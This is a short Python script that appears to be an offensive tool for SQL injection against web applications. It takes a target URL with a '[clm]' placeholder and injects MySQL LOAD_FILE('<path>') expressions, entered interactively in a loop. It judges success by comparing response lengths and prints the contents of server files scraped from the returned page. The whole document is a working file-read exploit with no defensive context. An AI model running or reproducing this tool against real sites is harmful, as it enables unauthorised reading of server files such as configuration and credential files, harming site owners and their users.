#!/usr/bin/env python3
import requests
import sys
from bs4 import BeautifulSoup
from colorama import Fore
import re


def checkLen(url,spcw="11116661111",):
    global result
    url = url.replace(r"[clm]",spcw) if url.find(r"[clm]") != -1 else False
    result = requests.get(url)
    ptn = spcw.replace("(","\(") if spcw.find("(") else spcw
    ptn = ptn.replace(")","\)") if ptn.find(")") else False
    k = len(re.findall(ptn,result.text))
    contentLen = len(result.text) - (len(spcw) * k)
    return contentLen 

    


# def infoCheck(url):
#     try:
#         result = requests.get(url)
#         if result.status_code == 200:
#             return 1, len(result.text)
#         # if(contentL > defS) :
#             # print(f"{furl:50s}   {Fore.GREEN}[Sucess]")
#             # soup = BeautifulSoup(result.text, "html.parser")
#             # myF =  soup.find_all("span", class_="fontc1")[0].getText()
#             # print(myF)
#         # else :
#             # print(f"{furl:50s}   {Fore.RED}[Failed]")
#     except Exception as e:
#         print(e)
#         return 0, 0

def frontend(argv):
    global host, payload, url, furl
    if len(argv) == 1:
        host = input(f"{Fore.LIGHTGREEN_EX}Enter host : {Fore.WHITE}")
        host = "http://" + host if host.startswith("http://") != True else host
        payload = "?" + \
             input(f"{Fore.LIGHTGREEN_EX}Enter payload : {Fore.WHITE}")

    elif len(argv) == 3 and argv[1] == "-u":
        host = sys.argv[2].split("?")[0]
        payload = "?"+sys.argv[2].split("?")[1]

    else:
        print(f"USAGE : python {argv[0]} [-u] Url [file] ")

    url = host + payload


if __name__ == "__main__":
    # x = requests.get(url)
    # defS = len(x.text)
    url = ""
    param = ""
    frontend(sys.argv)

    while(True):

        furl = input(f"{Fore.GREEN}Enter file location : {Fore.WHITE}")
        loadF = "LOAD_FILE"
        clm = loadF + "('" + furl + "')"
        if checkLen(url,clm) > checkLen(url) :
                r = checkLen(url,clm)
                print(f"{furl:50s}   {Fore.GREEN}[Sucess]")
                soup = BeautifulSoup(result.text, "html.parser")
                myF =  soup.find_all("span", class_="fontc1")[0].getText()
                print(f"{Fore.YELLOW}{myF}")
        else :
                print(f"{furl:50s}   {Fore.RED}[Failed]")